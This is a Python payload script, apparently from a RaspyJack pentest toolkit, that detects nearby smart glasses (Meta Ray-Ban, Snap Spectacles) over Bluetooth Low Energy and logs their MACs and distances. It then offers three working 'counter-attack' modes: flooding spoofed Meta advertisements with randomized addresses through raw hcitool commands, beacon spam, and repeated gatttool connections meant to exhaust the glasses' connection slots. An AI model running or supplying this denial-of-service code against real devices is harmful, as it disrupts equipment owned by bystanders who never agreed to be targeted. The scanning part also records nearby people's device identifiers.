#!/usr/bin/env python3
# @name: Smart Glasses Counter-Attack
# @desc: Detects smart glasses via BLE (Meta Ray-Ban, Snap Spectacles, etc.) then offers counter-attack modes to disrupt them via BLE flood/spam.
# @category: bluetooth
# @danger: false
# @active: true
# @web: true
"""
RaspyJack Payload -- Smart Glasses Counter-Attack
===================================================
Author: 7h30th3r0n3

Detects smart glasses via BLE (Meta Ray-Ban, Snap Spectacles, etc.)
then offers counter-attack modes to disrupt them via BLE flood/spam.

Based on research from:
  - Nearby Glasses (BLE Company ID detection)
  - Ban-Rays (IR + BLE fingerprinting)
  - BLE DoS / spam techniques

Setup / Prerequisites
---------------------
- Bluetooth adapter(s) (hci0 onboard + optional USB hci1)
- bleak for BLE scanning
- hcitool / hciconfig (bluez) for attack

Dual adapter mode:
  If 2+ BT adapters found, scan and attack run simultaneously.

Controls
--------
  python3 glasses_counter.py [duration_seconds] [flood|beacon|exhaust|all] [slow|med|fast|max]

    duration_seconds  -- optional, how long to run (default: run
                          until Ctrl-C)
    attack_mode       -- optional counter-attack mode. If omitted,
                          the payload only scans/reports and never
                          transmits.
    speed             -- optional attack broadcast speed (default: med)

  If more than one Bluetooth adapter is present, the first two are
  used automatically (adapter 0 for scanning, adapter 1 for attack,
  if available).

  Ctrl-C    -- stop scanning/attacking, export results, and print a
               summary

Loot: $CITYPOP_LOOT/counter_<timestamp>.json
"""

from __future__ import annotations

import asyncio
import json
import os
import random
import subprocess
import sys
import threading
import time
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_bt_interfaces

try:
    from bleak import BleakScanner
except Exception:
    BleakScanner = None

try:
    from bluepy.btle import Scanner as BluepyScanner
except Exception:
    BluepyScanner = None

LOOT_DIR = Path(os.environ.get("CITYPOP_LOOT", "."))

# ── Smart Glasses BLE Identifiers ────────────────────────────────────────────

GLASSES_COMPANY_IDS = {
    0x01AB: ("Meta Platforms", "Meta Glasses"),
    0x058E: ("Meta Platforms Tech", "Meta Glasses"),
    0x0D53: ("Luxottica", "Ray-Ban Meta"),
    0x03C2: ("Snapchat", "Spectacles"),
}

GLASSES_SERVICE_UUIDS = {
    "0000fd5f-0000-1000-8000-00805f9b34fb": ("Meta", "Meta Glasses"),
}

GLASSES_NAME_PREFIXES = (
    "ray-ban", "meta", "spectacles", "snap ",
    "stories", "wayfarer",
)

# Attack company IDs to spoof (targeting Meta ecosystem)
ATTACK_COMPANY_IDS = [0x01AB, 0x058E, 0x0D53]
META_SERVICE_UUID_BYTES = bytes.fromhex("5ffd0000")  # 0xFD5F in service data format

ATTACK_MODES = ["Flood", "Beacon", "Exhaust", "ALL"]
SPEED_LEVELS = [200, 100, 50, 25]  # ms between attacks
SPEED_LABELS = ["Slow", "Med", "Fast", "Max"]
OFFLINE_TIMEOUT = 30


# ── Utilities ────────────────────────────────────────────────────────────────

def estimate_distance(rssi: int) -> str:
    if rssi >= -50:
        return "< 1m"
    if rssi >= -60:
        return "1-3m"
    if rssi >= -70:
        return "3-10m"
    if rssi >= -75:
        return "10-15m"
    if rssi >= -80:
        return "15-20m"
    return "> 20m"


def _short(s: str, n: int) -> str:
    s = str(s or "")
    return s if len(s) <= n else (s[: n - 1] + "." if n > 1 else s[:n])


def _age_text(ts: int) -> str:
    diff = max(0, int(time.time()) - int(ts))
    m, s = divmod(diff, 60)
    if m >= 60:
        h, m = divmod(m, 60)
        return f"{h}h{m}m"
    return f"{m}m{s}s"


# ── Data classes ─────────────────────────────────────────────────────────────

@dataclass
class GlassesRecord:
    mac: str
    name: str
    brand: str
    model: str
    rssi: int
    company_id: int
    detection_method: str
    first_seen: int
    last_seen: int
    seen_count: int = 1

    @property
    def distance(self) -> str:
        return estimate_distance(self.rssi)

    @property
    def is_live(self) -> bool:
        return (int(time.time()) - self.last_seen) <= OFFLINE_TIMEOUT


@dataclass
class CounterState:
    # Detection
    glasses: Dict[str, GlassesRecord] = field(default_factory=dict)
    scan_enabled: bool = True
    total_ble_devices: int = 0
    scanner_backend: str = "init"
    scanner_health: str = "starting"
    last_error: str = ""
    events: deque = field(default_factory=lambda: deque(maxlen=50))
    # Alert
    alert_pending: bool = False
    alert_brand: str = ""
    alert_distance: str = ""
    # Attack
    attacking: bool = False
    attack_mode_idx: int = 0
    attack_speed_idx: int = 1
    attack_packets: int = 0
    attack_errors: int = 0
    attack_last_target: str = ""
    attack_status: str = "Idle"
    running_since: int = field(default_factory=lambda: int(time.time()))
    # Adapter
    scan_hci: str = ""
    attack_hci: str = ""
    dual_adapter: bool = False

    def live_glasses(self) -> List[GlassesRecord]:
        return [g for g in self.glasses.values() if g.is_live]

    def all_sorted(self) -> List[GlassesRecord]:
        return sorted(self.glasses.values(), key=lambda g: g.rssi, reverse=True)

    def live_macs(self) -> List[str]:
        return [g.mac for g in self.glasses.values() if g.is_live]


state = CounterState()
state_lock = threading.RLock()
running = True


# ── Scanner Worker ───────────────────────────────────────────────────────────

class ScannerWorker:
    """BLE scanner that detects smart glasses via Company IDs."""

    def __init__(self) -> None:
        self.stop_event = threading.Event()
        self.thread: Optional[threading.Thread] = None

    def start(self) -> None:
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def stop(self) -> None:
        self.stop_event.set()
        if self.thread:
            self.thread.join(timeout=3.0)

    def _run(self) -> None:
        if BleakScanner is not None:
            with state_lock:
                state.scanner_backend = "bleak"
                state.scanner_health = "running"
            try:
                asyncio.run(self._run_bleak())
                return
            except Exception as exc:
                with state_lock:
                    state.last_error = f"Bleak: {exc}"
                    state.scanner_health = "degraded"

        if BluepyScanner is not None:
            with state_lock:
                state.scanner_backend = "bluepy"
                state.scanner_health = "running"
            try:
                self._run_bluepy()
                return
            except Exception as exc:
                with state_lock:
                    state.last_error = f"Bluepy: {exc}"
                    state.scanner_health = "degraded"

        with state_lock:
            state.scanner_backend = "btctl"
            state.scanner_health = "running"
        self._run_bluetoothctl()

    async def _run_bleak(self) -> None:
        async def on_detect(device, adv_data) -> None:
            if self.stop_event.is_set() or not state.scan_enabled:
                return
            mac = str(device.address or "").lower()
            name = str(device.name or getattr(adv_data, "local_name", None) or "Unknown")
            rssi = int(getattr(adv_data, "rssi", None) or getattr(device, "rssi", -100))

            with state_lock:
                state.total_ble_devices += 1

            for company_id, mbytes in (adv_data.manufacturer_data or {}).items():
                if company_id in GLASSES_COMPANY_IDS:
                    brand, model = GLASSES_COMPANY_IDS[company_id]
                    self._record_glasses(mac, name, brand, model, rssi, company_id, "company_id")
                    return

            for uid in (adv_data.service_uuids or []):
                uid_lower = str(uid).lower()
                if uid_lower in GLASSES_SERVICE_UUIDS:
                    brand, model = GLASSES_SERVICE_UUIDS[uid_lower]
                    self._record_glasses(mac, name, brand, model, rssi, 0, "service_uuid")
                    return

            name_lower = name.lower()
            for prefix in GLASSES_NAME_PREFIXES:
                if name_lower.startswith(prefix):
                    self._record_glasses(mac, name, "Unknown", name, rssi, 0, "name")
                    return

        while not self.stop_event.is_set():
            # In single-adapter mode, pause scan while attacking
            with state_lock:
                if not state.dual_adapter and state.attacking:
                    pass  # still run scan briefly between attacks
            try:
                scanner = BleakScanner(detection_callback=on_detect)
                async with scanner:
                    t_end = time.monotonic() + 2.0
                    while time.monotonic() < t_end and not self.stop_event.is_set():
                        await asyncio.sleep(0.05)
            except Exception as exc:
                with state_lock:
                    state.last_error = f"scan: {_short(str(exc), 30)}"
                    state.scanner_health = "retrying"
                await asyncio.sleep(1.0)

    def _run_bluepy(self) -> None:
        while not self.stop_event.is_set():
            if not state.scan_enabled:
                time.sleep(0.2)
                continue
            try:
                scanner = BluepyScanner()
                devices = scanner.scan(2.0)
                with state_lock:
                    state.scanner_health = "running"
                for dev in devices:
                    if self.stop_event.is_set():
                        break
                    with state_lock:
                        state.total_ble_devices += 1
                    name = "Unknown"
                    for ad_type, desc, value in dev.getScanData():
                        sval = str(value or "").strip()
                        if desc in ("Complete Local Name", "Short Local Name") and sval:
                            name = sval
                        if ad_type == 0xFF and len(sval) >= 4:
                            try:
                                raw = bytes.fromhex(sval)
                                if len(raw) >= 2:
                                    cid = int.from_bytes(raw[:2], "little")
                                    if cid in GLASSES_COMPANY_IDS:
                                        brand, model = GLASSES_COMPANY_IDS[cid]
                                        mac = str(getattr(dev, "addr", "")).lower()
                                        rssi = int(getattr(dev, "rssi", -100))
                                        self._record_glasses(mac, name, brand, model, rssi, cid, "company_id")
                            except (ValueError, TypeError):
                                pass
            except Exception as exc:
                with state_lock:
                    state.last_error = f"bluepy: {_short(str(exc), 30)}"
                    state.scanner_health = "retrying"
                time.sleep(1.0)

    def _run_bluetoothctl(self) -> None:
        try:
            subprocess.run(["hciconfig", "hci0", "up"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=4)
        except Exception:
            pass
        btctl_proc = None
        while not self.stop_event.is_set():
            if not state.scan_enabled:
                time.sleep(0.2)
                continue
            try:
                if btctl_proc is None:
                    btctl_proc = subprocess.Popen(
                        ["bluetoothctl"], stdin=subprocess.PIPE,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, text=True,
                    )
                    if btctl_proc.stdin:
                        btctl_proc.stdin.write("scan on\n")
                        btctl_proc.stdin.flush()
                proc = subprocess.run(
                    ["bluetoothctl", "devices"],
                    capture_output=True, text=True, timeout=8,
                )
                for line in (proc.stdout or "").splitlines():
                    parts = line.strip().split(None, 2)
                    if len(parts) >= 3 and parts[0] == "Device":
                        name = parts[2]
                        name_lower = name.lower()
                        for prefix in GLASSES_NAME_PREFIXES:
                            if name_lower.startswith(prefix):
                                mac = parts[1].lower()
                                self._record_glasses(mac, name, "Unknown", name, -99, 0, "name")
                                break
                        with state_lock:
                            state.total_ble_devices += 1
                with state_lock:
                    state.scanner_health = "running"
            except Exception as exc:
                with state_lock:
                    state.last_error = f"btctl: {_short(str(exc), 30)}"
            time.sleep(2.0)
        if btctl_proc:
            try:
                btctl_proc.terminate()
                btctl_proc.wait(timeout=2)
            except Exception:
                pass

    def _record_glasses(self, mac: str, name: str, brand: str, model: str,
                        rssi: int, company_id: int, method: str) -> None:
        now = int(time.time())
        with state_lock:
            if mac in state.glasses:
                rec = state.glasses[mac]
                rec.last_seen = now
                rec.rssi = rssi
                rec.seen_count += 1
                if name != "Unknown" and rec.name == "Unknown":
                    rec.name = name
            else:
                state.glasses[mac] = GlassesRecord(
                    mac=mac, name=name, brand=brand, model=model,
                    rssi=rssi, company_id=company_id,
                    detection_method=method,
                    first_seen=now, last_seen=now,
                )
                state.alert_pending = True
                state.alert_brand = brand
                state.alert_distance = estimate_distance(rssi)
            state.events.appendleft({
                "t": now, "mac": mac, "brand": brand,
                "model": model, "rssi": rssi,
            })


# ── Attack Worker ────────────────────────────────────────────────────────────

class AttackWorker:
    """BLE attack engine using hcitool HCI commands."""

    def __init__(self) -> None:
        self.stop_event = threading.Event()
        self.thread: Optional[threading.Thread] = None

    def start(self) -> None:
        self.stop_event.clear()
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def stop(self) -> None:
        self.stop_event.set()
        if self.thread:
            self.thread.join(timeout=3.0)

    def _hci(self, args: List[str]) -> bool:
        """Run an hcitool command, return True on success."""
        with state_lock:
            hci_dev = state.attack_hci
        try:
            result = subprocess.run(
                ["sudo", "hcitool", "-i", hci_dev] + args,
                capture_output=True, timeout=5,
            )
            return result.returncode == 0
        except Exception:
            return False

    def _hciconfig(self, args: List[str]) -> bool:
        with state_lock:
            hci_dev = state.attack_hci
        try:
            result = subprocess.run(
                ["sudo", "hciconfig", hci_dev] + args,
                capture_output=True, timeout=5,
            )
            return result.returncode == 0
        except Exception:
            return False

    def _randomize_mac(self) -> None:
        """Set a random BLE static address."""
        mac_bytes = [random.randint(0, 255) for _ in range(6)]
        mac_bytes[0] |= 0xC0  # static random address
        mac_hex = [f"{b:02X}" for b in mac_bytes]
        self._hci(["cmd", "0x08", "0x0005"] + mac_hex)

    def _set_adv_params(self, interval_hex: str = "20") -> None:
        """Set LE advertising parameters: non-connectable, random address."""
        self._hci([
            "cmd", "0x08", "0x0006",
            interval_hex, "00",  # min interval
            interval_hex, "00",  # max interval
            "03",                # type: non-connectable undirected
            "01",                # own addr: random
            "00",                # peer addr type
            "00", "00", "00", "00", "00", "00",
            "07",                # channel map: all
            "00",                # filter: none
        ])

    def _set_adv_data(self, data: bytes) -> bool:
        """Set LE advertising data (max 31 bytes)."""
        payload = list(data)
        data_len = len(payload)
        while len(payload) < 30:
            payload.append(0x00)
        payload = payload[:30]
        full = [data_len] + payload
        hex_str = [f"{b:02X}" for b in full]
        return self._hci(["cmd", "0x08", "0x0008"] + hex_str)

    def _enable_adv(self) -> None:
        self._hci(["cmd", "0x08", "0x000a", "01"])

    def _disable_adv(self) -> None:
        self._hci(["cmd", "0x08", "0x000a", "00"])

    def _broadcast_once(self, adv_data: bytes, label: str) -> bool:
        """Send one advertisement cycle with randomized MAC."""
        try:
            self._disable_adv()
            self._randomize_mac()
            self._set_adv_params()
            if not self._set_adv_data(adv_data):
                # Reset and retry
                self._hciconfig(["reset"])
                time.sleep(0.2)
                self._hciconfig(["up"])
                self._randomize_mac()
                self._set_adv_params()
                if not self._set_adv_data(adv_data):
                    with state_lock:
                        state.attack_errors += 1
                    return False
            self._enable_adv()
            time.sleep(0.05)  # brief broadcast window
            self._disable_adv()
            with state_lock:
                state.attack_packets += 1
                state.attack_last_target = label
            return True
        except Exception:
            with state_lock:
                state.attack_errors += 1
            return False

    def _build_flood_packet(self) -> tuple:
        """Build fake Meta manufacturer data packet."""
        cid = random.choice(ATTACK_COMPANY_IDS)
        cid_lo = cid & 0xFF
        cid_hi = (cid >> 8) & 0xFF
        rand_data = bytes(random.randint(0, 255) for _ in range(20))
        adv = bytes([
            0x02, 0x01, 0x06,           # Flags: LE General + BR/EDR not supported
            len(rand_data) + 3, 0xFF,    # Length, Type=Manufacturer Specific
            cid_lo, cid_hi,              # Company ID (little-endian)
        ]) + rand_data
        return adv, f"Flood:0x{cid:04X}"

    def _build_beacon_packet(self) -> tuple:
        """Build fake Meta service UUID beacon."""
        rand_data = bytes(random.randint(0, 255) for _ in range(16))
        # Service Data with UUID 0xFD5F (Meta)
        adv = bytes([
            0x02, 0x01, 0x06,           # Flags
            0x03, 0x03, 0x5F, 0xFD,     # Complete 16-bit UUID: 0xFD5F
            len(rand_data) + 3, 0x16,   # Service Data
            0x5F, 0xFD,                  # UUID 0xFD5F (little-endian)
        ]) + rand_data
        return adv, "Beacon:FD5F"

    def _attack_exhaust_once(self) -> bool:
        """Attempt GATT connection to detected glasses MAC to exhaust slots."""
        with state_lock:
            macs = state.live_macs()
        if not macs:
            return False
        target_mac = random.choice(macs)
        with state_lock:
            hci_dev = state.attack_hci
        try:
            # Use gatttool to attempt connection (will likely fail/timeout)
            subprocess.run(
                ["sudo", "gatttool", "-i", hci_dev, "-b", target_mac, "--connect"],
                capture_output=True, timeout=3,
            )
            with state_lock:
                state.attack_packets += 1
                state.attack_last_target = f"Conn:{target_mac[-8:]}"
            return True
        except subprocess.TimeoutExpired:
            with state_lock:
                state.attack_packets += 1
                state.attack_last_target = f"Conn:{target_mac[-8:]}"
            return True
        except Exception:
            with state_lock:
                state.attack_errors += 1
            return False

    def _run(self) -> None:
        # Ensure adapter is up
        self._hciconfig(["up"])
        time.sleep(0.2)

        with state_lock:
            state.attack_status = "Running"

        while not self.stop_event.is_set():
            with state_lock:
                if not state.attacking:
                    break
                mode = ATTACK_MODES[state.attack_mode_idx]
                delay_ms = SPEED_LEVELS[state.attack_speed_idx]

            builders = []
            if mode in ("Flood", "ALL"):
                builders.append(("flood", self._build_flood_packet))
            if mode in ("Beacon", "ALL"):
                builders.append(("beacon", self._build_beacon_packet))

            if builders:
                kind, builder = random.choice(builders)
                adv_data, label = builder()
                self._broadcast_once(adv_data, label)

            if mode in ("Exhaust", "ALL"):
                self._attack_exhaust_once()

            time.sleep(delay_ms / 1000.0)

        # Cleanup
        self._disable_adv()
        self._hciconfig(["reset"])
        with state_lock:
            state.attack_status = "Idle"


# ── Export ───────────────────────────────────────────────────────────────────

def export_json() -> str:
    LOOT_DIR.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = LOOT_DIR / f"counter_{ts}.json"
    with state_lock:
        data = {
            "timestamp": ts,
            "attack_packets": state.attack_packets,
            "attack_mode": ATTACK_MODES[state.attack_mode_idx],
            "glasses": [
                {
                    "mac": g.mac, "name": g.name, "brand": g.brand,
                    "model": g.model, "rssi": g.rssi, "distance": g.distance,
                    "company_id": f"0x{g.company_id:04X}" if g.company_id else None,
                    "seen_count": g.seen_count,
                }
                for g in state.glasses.values()
            ],
        }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    return path


# ── Main ─────────────────────────────────────────────────────────────────────

def _usage():
    modes = "|".join(m.lower() for m in ATTACK_MODES)
    speeds = "|".join(s.lower() for s in SPEED_LABELS)
    print(f"Usage: {os.path.basename(__file__)} [duration_seconds] [{modes}] [{speeds}]", flush=True)
    print("  duration_seconds  how long to run (default: run until Ctrl-C)", flush=True)
    print(f"  attack_mode       one of: {modes} (optional; omit to only scan/report)", flush=True)
    print(f"  speed             one of: {speeds} (default: med)", flush=True)


def main():
    global running

    args = sys.argv[1:]
    if args and args[0] in ("-h", "--help"):
        _usage()
        return 0

    duration = None
    if args:
        try:
            duration = float(args[0])
            args = args[1:]
        except ValueError:
            pass

    mode_names = [m.lower() for m in ATTACK_MODES]
    speed_names = [s.lower() for s in SPEED_LABELS]
    attack_requested = False

    if args and args[0].lower() in mode_names:
        with state_lock:
            state.attack_mode_idx = mode_names.index(args[0].lower())
        attack_requested = True
        args = args[1:]

    if args and args[0].lower() in speed_names:
        with state_lock:
            state.attack_speed_idx = speed_names.index(args[0].lower())
        args = args[1:]

    # Detect BT adapters
    bt_ifaces = list_bt_interfaces()
    if not bt_ifaces:
        print("No Bluetooth adapter found.", flush=True)
        return 1

    # Assign adapters
    with state_lock:
        if len(bt_ifaces) >= 2:
            state.dual_adapter = True
            state.scan_hci = bt_ifaces[0]["name"]
            state.attack_hci = bt_ifaces[1]["name"]
        else:
            state.dual_adapter = False
            state.scan_hci = bt_ifaces[0]["name"]
            state.attack_hci = bt_ifaces[0]["name"]
        dual = state.dual_adapter
        s_hci = state.scan_hci
        a_hci = state.attack_hci

    # Ensure adapters are up
    for ifc in bt_ifaces[:2]:
        subprocess.run(["sudo", "hciconfig", ifc["name"], "up"],
                       capture_output=True, timeout=5)

    if dual:
        print(f"Scan adapter: {s_hci}  Attack adapter: {a_hci}", flush=True)
    else:
        print(f"Single adapter: {s_hci} (scan and attack share it)", flush=True)

    if attack_requested:
        with state_lock:
            mode = ATTACK_MODES[state.attack_mode_idx]
            speed = SPEED_LABELS[state.attack_speed_idx]
        print(f"Counter-attack ENABLED: mode={mode} speed={speed}", flush=True)
    else:
        print("Scan-only mode (no attack_mode given).", flush=True)

    if duration:
        print(f"Running for {duration:.0f}s ...", flush=True)
    else:
        print("Running until Ctrl-C ...", flush=True)

    # Start scanner (and attacker, if requested)
    scanner = ScannerWorker()
    scanner.start()
    attacker = None
    if attack_requested:
        with state_lock:
            state.attacking = True
        attacker = AttackWorker()
        attacker.start()

    start_time = time.time()
    last_event_count = 0

    try:
        while running:
            time.sleep(3.0)

            with state_lock:
                live = state.live_glasses()
                total = len(state.glasses)
                ble_total = state.total_ble_devices
                atk_pkts = state.attack_packets
                atk_err = state.attack_errors
                atk_status = state.attack_status
                events = list(state.events)

            # Print any new detection events (most recent first in deque)
            new_events = events[: max(0, len(events) - last_event_count)]
            for ev in reversed(new_events):
                dist = estimate_distance(ev["rssi"])
                print(f"[ALERT] {ev['brand']} {ev['model']} mac={ev['mac']} "
                      f"rssi={ev['rssi']} dist={dist}", flush=True)
            last_event_count = len(events)

            elapsed = time.time() - start_time
            status = f"[{elapsed:6.1f}s] live={len(live)} total={total} ble_seen={ble_total}"
            if attack_requested:
                status += f" attack={atk_status} sent={atk_pkts} errors={atk_err}"
            print(status, flush=True)

            if duration and elapsed >= duration:
                break

    except KeyboardInterrupt:
        print("\nStopping...", flush=True)

    finally:
        with state_lock:
            state.attacking = False
        if attacker:
            attacker.stop()
        scanner.stop()

        with state_lock:
            glasses_list = state.all_sorted()
            atk_pkts = state.attack_packets
            atk_err = state.attack_errors

        print("\nFinal results:", flush=True)
        if glasses_list:
            for g in glasses_list:
                print(f"  {g.brand} {g.model}  mac={g.mac}  rssi={g.rssi}  "
                      f"dist={g.distance}  seen={g.seen_count}x  "
                      f"{'live' if g.is_live else 'offline'}", flush=True)
        else:
            print("  No glasses detected.", flush=True)

        if attack_requested:
            print(f"  Attack packets sent: {atk_pkts}  errors: {atk_err}", flush=True)

        if glasses_list:
            path = export_json()
            print(f"\nExported to {path}", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
